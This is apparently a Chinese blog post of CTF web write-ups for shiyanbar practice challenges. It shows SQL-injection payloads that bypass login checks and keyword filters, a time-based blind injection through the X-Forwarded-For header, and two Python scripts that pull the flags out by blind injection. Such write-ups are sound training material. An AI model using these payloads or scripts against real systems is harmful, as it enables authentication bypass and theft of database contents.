<!DOCTYPE HTML>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <!--Setting-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta name="renderer" content="webkit|ie-comp|ie-stand">
    <meta name="apple-mobile-web-app-capable" content="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    <meta name="browsermode" content="application">
    <meta name="screen-orientation" content="portrait">
    <meta name="theme-version" content="1.2.3">
    <meta name="root" content="/">
    <link rel="dns-prefetch" href="https://www.ljjyy.com">
    <!--SEO-->

    <meta name="keywords" content="练习,webwriteup,ctf">


    <meta name="description" content="Web题目系列2
登陆一下好吗?题目链接http://shiyanbar.com/ctf/1942
题目描述
123不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!flag格式：ctf&#...">



<meta name="robots" content="all">
<meta name="google" content="all">
<meta name="googlebot" content="all">
<meta name="verify" content="all">

    <!--Title-->


<title>CTF题目之Web Writeup通关大全(二) | 来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</title>


    <link rel="alternate" href="/atom.xml" title="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟" type="application/atom+xml">


    <link rel="icon" href="/favicon.ico">

    



<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7">
<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.5.0">
<link rel="stylesheet" href="/css/style.css?rev=@@hash">




    
	<div class="hide">
        <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
        <script>LA.init({id: "JgbNOaw1xxsmUUsQ",ck: "JgbNOaw1xxsmUUsQ"})</script>
	</div>






    
    <meta name="baidu-site-verification" content="dTHILoORpx">


    <script>
        (function(){
            var bp = document.createElement('script');
            var curProtocol = window.location.protocol.split(':')[0];
            if (curProtocol === 'https') {
                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
            }
            else {
                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
            }
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(bp, s);
        })();
    </script>

</head>

</html>
<!--[if lte IE 8]>
<style>
    html{ font-size: 1em }
</style>
<![endif]-->
<!--[if lte IE 9]>
<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
<![endif]-->

<body>
    <header class="main-header"  >
    <div class="main-header-box">
        <!--a class="header-avatar" href="/" title='Ljjyy.com'>
            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
        </a-->
        <div class="branding">
            
                <h2> 多读书多实践，勤思考善领悟 </h2>
            
    	  </div>
    </div>
</header>
    <nav class="main-navigation">
    <div class="container">

        <div class="row">
            <div class="col-sm-12">
                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
                    <span class="sr-only"></span>
                        <i class="fa fa-bars"></i>
                    </span>
                    <a class="web-logo"  href="/" title='Ljjyy.com'></a>
                    <!--a class="navbar-brand" href="https://www.ljjyy.com">来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</a-->
                </div>
                <div class="collapse navbar-collapse" id="main-menu" style="">
                    <ul class="menu">
                        
                            <li role="presentation" class="text-center">
                                <a href="/"><i class="fa "></i>首页</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/cloud/"><i class="fa "></i>云计算</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/front/"><i class="fa "></i>前端</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/back/"><i class="fa "></i>后端</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/devops/"><i class="fa "></i>运维</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/crack/"><i class="fa "></i>破解</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/penetration/"><i class="fa "></i>渗透</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/tool/"><i class="fa "></i>工具</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/other/"><i class="fa "></i>其他</a>
                            </li>
                        
                    </ul>
                </div>
            </div>
        </div>
    </div>
</nav>
    <section class="content-wrap">
        <div class="container">
            <div class="row">
                <main class="col-md-8 main-content m-post">
                    <p id="process"></p>
<article class="post">
    <div class="post-head">
        <h1 id="CTF题目之Web Writeup通关大全(二)">
            
	            CTF题目之Web Writeup通关大全(二)
            
        </h1>
        <div class="post-meta">
    
        <span class="categories-meta fa-wrap">
            <i class="fa fa-folder-open-o"></i>
            <a class="category-link" href="/categories/penetration/">渗透</a>
        </span>
    

    
        <span class="fa-wrap">
            <i class="fa fa-tags"></i>
            <span class="tags-meta">
                
                    <a class="tag-link" href="/tags/ctf/">ctf</a> <a class="tag-link" href="/tags/webwriteup/">webwriteup</a> <a class="tag-link" href="/tags/practise/">练习</a>
                
            </span>
        </span>
    

    
        
        <span class="fa-wrap">
            <i class="fa fa-clock-o"></i>
            <span class="date-meta">2018/10/02</span>
        </span>
        
    
</div>
            
            
            <p class="fa fa-exclamation-triangle warning">
                本文于<strong>1650</strong>天之前发表，文中内容可能已经过时。
            </p>
        
    </div>
    
    <div class="post-body post-content">
        <p>Web题目系列2</p>
<h1 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗?"></a>登陆一下好吗?</h1><p>题目链接<br><a href="http://shiyanbar.com/ctf/1942" target="_blank" rel="noopener">http://shiyanbar.com/ctf/1942</a><br><img src="/img/posts/dcece9c1c2b18fe47a120ebc88ea9001.png" alt="img"></p>
<p>题目描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!</span><br><span class="line"></span><br><span class="line">flag格式：ctf&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>
<p>解题思路<br>一个万能密码问题，多试试就可以了。</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: ''='</span><br><span class="line">password: ''='</span><br></pre></td></tr></table></figure>
<h1 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h1><p>题目链接<br><a href="http://shiyanbar.com/ctf/1941" target="_blank" rel="noopener">http://shiyanbar.com/ctf/1941</a></p>
<p>题目描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我要把攻击我的人都记录db中去!</span><br></pre></td></tr></table></figure>
<p>解题思路<br>看到题目就想到修改<code>x-forwarded-for</code>来进行注入。经过测试，<code>,</code>以及后面的内容都会被过滤，这就导致我们的传统注入语句失效了，这里可以使用<code>case when then</code>语句进行注入。</p>
<ol>
<li>判断数据库名称长度 <code>1&#39; and case when (length((SELECT concat(database())))&amp;lt;5) then sleep(3) else sleep(0) end and &#39;1&#39;=&#39;1</code>，此句如果执行有延迟，则说明数据库名称小于5个字符，使用<code>&amp;lt;4</code>的时候，执行不成功，说明数据库长度为4个字符。</li>
<li>判断数据库名的各个字符，<code>&amp;quot;1&#39; and case when (substring((select database()) from %s for 1)=&#39;%s&#39;) then sleep(5) else sleep(0) end and &#39;1&#39;=&#39;1&amp;quot;%(i,each)</code>，其中i<code>i</code>为从第i个字符开始,<code>for 1</code>为取一个字符，<code>each</code>为ascii，从此句可判断数据库名为<code>web4</code></li>
<li>查看数据库中表单的数量，<code>1&#39; and case when ((select count(TABLE_NAME) from information_schema.tables where table_schema=&#39;web4&#39;) = 2) then sleep(3) else sleep(0) end and &#39;1&#39;=&#39;1;</code>此句判断数据库中有两个表。</li>
<li>判断数据库表名长度，<code>&amp;quot;1&#39; and case when(substring((select group_concat(table_name separator &#39;;&#39;) from information_schema.tables where table_schema=&#39;web4&#39;) from %s for 1)=&#39;&#39;) then sleep(6) else 0 end and &#39;a&#39;=&#39;a&amp;quot; % (i)</code>，其中<code>i</code>为长度。</li>
<li>判断数据库表名，<code>&amp;quot;1&#39; and case when(ascii(substring((select group_concat(table_name separator &#39;;&#39;) from information_schema.tables where table_schema=&#39;web4&#39;) from %s for 1))=%s) then sleep(6) else 0 end and &#39;a&#39;=&#39;a&amp;quot; % (i,each)</code>，其中i<code>i</code>为从第i个字符开始,<code>for 1</code>为取一个字符，<code>each</code>为ascii，找到表<code>flag</code>。</li>
<li>判断表flag字段，<code>&amp;quot;1&#39; and case when(ascii(substring((select group_concat(column_name separator &#39;;&#39;) from information_schema.columns where table_name=&#39;flag&#39;) from %s for 1))=%s) then sleep(6) else 0 end and &#39;a&#39;=&#39;a&amp;quot; % (i,each)</code>，得到字段<code>flag</code>。</li>
<li>判断表flag，字段flag中内容长度，<code>&amp;quot;1&#39; and case when(length(substring((select group_concat(flag separator &#39;;&#39;) from flag) from %s for 1))=&#39;&#39;) then sleep(6) else 0 end and &#39;a&#39;=&#39;a&amp;quot; %i</code>。</li>
<li>获取flag值，<code>&amp;quot;1&#39; and (select case when (substring((select flag from flag ) from %d for 1 )=&#39;%s&#39;) then sleep(10) else sleep(0) end ) and &#39;1&#39;=&#39;1&amp;quot;%(i,str)</code>。</li>
<li>flag值为</li>
</ol>
<p>列一下获取flag的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment">#-*-coding:utf-8-*-#基于python2.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">payloads=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789@_.&#123;&#125;-'</span> </span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">print(<span class="string">"Start"</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):  </span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:  </span><br><span class="line">        starttime = time.time()<span class="comment">#记录当前时间  </span></span><br><span class="line">        url = <span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span><span class="comment">#题目url  </span></span><br><span class="line">        headers = &#123;<span class="string">"Host"</span>: <span class="string">"ctf5.shiyanbar.com"</span>,  </span><br><span class="line">                   <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"</span>,  </span><br><span class="line">                   <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,  </span><br><span class="line">                   <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,  </span><br><span class="line">                   <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,  </span><br><span class="line">                   <span class="string">"Cookie"</span>: <span class="string">"Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1470994390,1470994954,1470995086,1471487815; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*67928%2CnickName%3Ayour"</span>,  </span><br><span class="line">                   <span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,  </span><br><span class="line">                   <span class="string">"X-FORWARDED-FOR"</span>:<span class="string">"127.0.0.1' and case when ((select count(flag) from flag where flag like '"</span>+flag+payload+<span class="string">"%')&gt;0) then sleep(5) else sleep(0) end and '1'='1"</span>  </span><br><span class="line">                   &#125;  </span><br><span class="line">        <span class="comment">#bp拿到header并对X-FORWARDED-FOR进行修改，后面语句大意为从flag中选择出flag，若首字母段为flag，payload变量拼接则sleep5秒,看不懂的可以学一下case when语句和like %语句  </span></span><br><span class="line">        res = requests.get(url, headers=headers)  </span><br><span class="line">        <span class="keyword">if</span> time.time() - starttime &gt; <span class="number">5</span>:  </span><br><span class="line">            starttime2 = time.time()  </span><br><span class="line">            res = requests.get(url, headers=headers)  </span><br><span class="line">            <span class="keyword">if</span> time.time() - starttime &gt; <span class="number">5</span>:  </span><br><span class="line">                flag += payload  </span><br><span class="line">                print(<span class="string">"flag is:%s"</span>%flag)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#print('',)#没啥解释的了，就是不断试payload，找到就接到flag上去然后继续试下一个  </span></span><br><span class="line">print(<span class="string">'\n[Finally] current flag is %s'</span> % flag) </span><br><span class="line"><span class="comment"># cdbf14c9551d5be5612f7bb5d2867853</span></span><br></pre></td></tr></table></figure>
<p>这道题提交必须加ctf，是个坑，提交了好多次，才正确。<br>ctf{cdbf14c9551d5be5612f7bb5d2867853}</p>
<p><img src="/img/posts/f5b7455019a82429f7bb04c75636fda7.png" alt="img"></p>
<h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>题目链接<br><a href="http://shiyanbar.com/ctf/1940" target="_blank" rel="noopener">http://shiyanbar.com/ctf/1940</a><br><img src="/img/posts/3760b4545ab6024969114cef3070b1db.png" alt="img"><br>题目描述</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问解题链接去访问题目,可以进行答题。根据web题一般解题思路去解答此题。看源码，请求，响应等。提交与题目要求一致的内容即可返回<span class="built_in">flag</span>。然后提交正确的<span class="built_in">flag</span>即可得分。web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识。</span><br><span class="line"></span><br><span class="line"><span class="built_in">flag</span>格式 CTF&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>解题思路<br>在注释里找到<code>&lt;!--source: source.txt--&gt;</code>，是源码文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到此题目设置了三个坑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> $filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="number">2.</span> <span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line"><span class="number">3.</span> <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br></pre></td></tr></table></figure>
<p>每一个都得绕过，首先第一个问题是过滤了一些字符串，但是由于已经给出了哪些字符被过滤了，所有很好绕过，使用<code>1&#39; or &#39;1&#39; #</code>绕过。<br>第二个要求用户名查询结果集只有一个，直接使用语句<code>1&#39; or 1 limit 1 offset 0 #</code>绕过。<br>第三个要求只有一个条目的结果集中<code>pwd</code>字段要和用户提交的字段<code>pwd</code>一样，如果一样，则返回flag。这个坑可以通过使用<code>group by with rollup</code>语句进行绕过，<code>with rollup</code>的作用请看下面的讲解，使用它绕过坑3的原理就是让null=null，先列出payload<code>1&#39; or 1 group by pwd with rollup limit 1 offset 2#</code>，可以看到offset后面改为了<code>2</code>，同时gourp by的字段为<code>pwd</code>，这利用了<code>with roolup</code>的一个特性，当offset偏移刚好为条目最后一条+1时，还是会列出最后一条的信息，但同时本身语句是查不出内容的，当前pwd也无法聚合出内容，mysql就给出了null，这样就绕过了坑3。</p>
<blockquote>
<p>GROUP BY子句允许一个将额外行添加到简略输出端 WITH ROLLUP 修饰符。这些行代表高层(或高聚集)简略操作。ROLLUP 因而允许你在多层分析的角度回答有关问询的问题。或者你可以使用 ROLLUP, 它能用一个问询提供双层分析。将一个 WITH ROLLUP修饰符添加到GROUP BY 语句，使询问产生另一行结果，该行显示了所有年份的总价值：<br>mysql&gt; SELECT year, SUM(profit) FROM sales GROUP BY year WITH ROLLUP;<br>+——+————-+<br>| year | SUM(profit) |<br>+——+————-+<br>| 2000 | 4525 |<br>| 2001 | 3010 |<br>| NULL | 7535 |<br>+——+————-+</p>
</blockquote>
<h1 id="简单的sql注入之1"><a href="#简单的sql注入之1" class="headerlink" title="简单的sql注入之1"></a>简单的sql注入之1</h1><p>题目链接<br><a href="http://shiyanbar.com/ctf/1875" target="_blank" rel="noopener">http://shiyanbar.com/ctf/1875</a></p>
<p>题目描述</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过注入获得<span class="built_in">flag</span>值（提交格式：<span class="built_in">flag</span>&#123;&#125;）。</span><br></pre></td></tr></table></figure>
<p>解题思路<br>经过fuzz，发现题目过滤了<code>union,select</code>,但是当输入的是<code>unionselect</code>的时候，就发现</p>
<p>都能显示出来，这种情况一般猜测是过滤空格和空格之间的内容，使用各种如<code>+，/**/,/*!*/，%0a</code>的都可以绕过空格。给出一个payload，<code>id=1&#39;+union%0aselect/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code>。<br>flag{Y0u_@r3_5O_dAmn_90Od}<br><img src="/img/posts/93e2de9be6c6ad8a4a51fea60caa9d6b.png" alt="img"><br>再给一个获取所有表的payload，<code>id=1&#39;+union%0aselect/**/TABLE_NAME/**/from/**/information_schema.tables/**/where/**/&#39;1&#39;=&#39;1</code>。<br><img src="/img/posts/cdd08692aaaa57b2f07c23784380ff54.png" alt="img"></p>
<h1 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h1><p>题目链接<br><a href="http://shiyanbar.com/ctf/1908" target="_blank" rel="noopener">http://shiyanbar.com/ctf/1908</a><br><img src="/img/posts/1cfb812c7dc777a47c3deb68c89a71fb.png" alt="img"><br>题目描述</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有回显的<span class="selector-tag">mysql</span>注入</span><br><span class="line">格式：<span class="selector-tag">flag</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>解题思路<br>和上一类似，有区别的是这道题目又过滤了<code>%0a</code>，给出payload，<code>id=1%27/**/union+select/**/flag/**/from/**/flag/**/where/**/%271%27=%271</code>。<br><img src="/img/posts/a502d9d82925711d4108a76d0d12aec3.png" alt="img"><br>flag{Y0u_@r3_5O_dAmn_90Od}</p>
<h1 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h1><p>题目链接<br><a href="http://shiyanbar.com/ctf/1909" target="_blank" rel="noopener">http://shiyanbar.com/ctf/1909</a><br><img src="/img/posts/4a9df8ca1cdbd5f92ace5bec414bf011.png" alt="img"><br>题目描述</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mysql</span>报错注入</span><br><span class="line"></span><br><span class="line">格式：<span class="selector-tag">flag</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>解题思路<br>此题目使用sqlmap可以直接跑出来，因为题目给出了报错注入(这是坑)，测试了updatexml、extractvalue使用不了，但是测试<code>id=1&#39; and ascii(substr(database(),1,1))&amp;lt;200 --+</code>，发现可以正常执行。中间就不给出如何去爆库，表，列了，可以参考who are you?中的方式，给出执行脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">string = string.digits+string.ascii_lowercase</span><br><span class="line">flag = []</span><br><span class="line">FLAG = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC</span><span class="params">(x,i)</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/web/index_3.php?id='</span></span><br><span class="line">    poc = <span class="string">"1'and ascii(substr((select flag from flag),%d,1))=%d--+ "</span> % (x, i)</span><br><span class="line">    res = requests.get(url+poc)</span><br><span class="line">    print(<span class="string">'testing url:'</span> + url + poc) <span class="comment"># test...</span></span><br><span class="line">    <span class="keyword">if</span> res.text.find(<span class="string">"Hello"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>, <span class="number">129</span>):  <span class="comment"># ascii码可见字符32-127</span></span><br><span class="line">        <span class="keyword">if</span> POC(x, i):</span><br><span class="line">           flag.append(chr(i))  <span class="comment"># chr()将整数转为对应的ascii码字符</span></span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">128</span>:  <span class="comment"># 当该位flag没有匹配的字符时退出循环</span></span><br><span class="line">            FLAG = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> FLAG:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 以字符串的形式输出结果</span></span><br><span class="line">get_flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    get_flag += i</span><br><span class="line"><span class="keyword">print</span> get_flag</span><br></pre></td></tr></table></figure>
<p><img src="/img/posts/c7ee3006b4943f299c9db3cafbd2d74f.png" alt="img"><br>flag{Y0u_@r3_5O_dAmn_90Od}</p>
<h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>题目链接<br><a href="http://shiyanbar.com/ctf/1854" target="_blank" rel="noopener">http://shiyanbar.com/ctf/1854</a><br><img src="/img/posts/bbcb3833d9ce677c45f1c927e3869806.png" alt="img"><br>题目描述</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看看响应头</span><br><span class="line"></span><br><span class="line">格式：<span class="selector-tag">CTF</span>&#123; &#125;</span><br></pre></td></tr></table></figure>
